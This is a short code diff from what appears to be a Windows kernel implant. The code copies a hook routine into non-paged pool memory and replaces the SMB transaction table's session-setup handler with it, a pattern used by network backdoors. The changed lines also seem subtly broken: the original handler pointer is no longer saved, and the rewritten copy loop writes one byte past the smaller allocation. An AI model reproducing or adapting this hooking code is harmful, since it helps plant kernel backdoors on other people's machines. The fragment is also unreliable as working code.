@@ -125,15 +125,16 @@ FoundTransactionTable:
     HookNm = (DWORD)(
 	((ULONG_PTR)&SpAcceptLsaModeContext_Hook_End) - 
 	((ULONG_PTR)&SpAcceptLsaModeContext_Hook));    
-    HckPtr = Func.ExAllocatePool(NonPagedPool, HookNm + 4);
+    
+    HckPtr = Func.ExAllocatePool(NonPagedPool, HookNm);
     
     OnePtr = HckPtr; TwoPtr = (LPVOID)
       &SpAcceptLsaModeContext_Hook;
 
-    while ( HookNm-- != 0 )
+    do {
       *(BYTE *)OnePtr++ = *(BYTE *)TwoPtr++;
+    } while ( HookNm-- != 0 );
 
-    g_SrvTransactionNotImplemented = TrnTbl[INDEX_SESSION_SETUP];
     TrnTbl[INDEX_SESSION_SETUP]    = (LPVOID)HckPtr;
   };
 
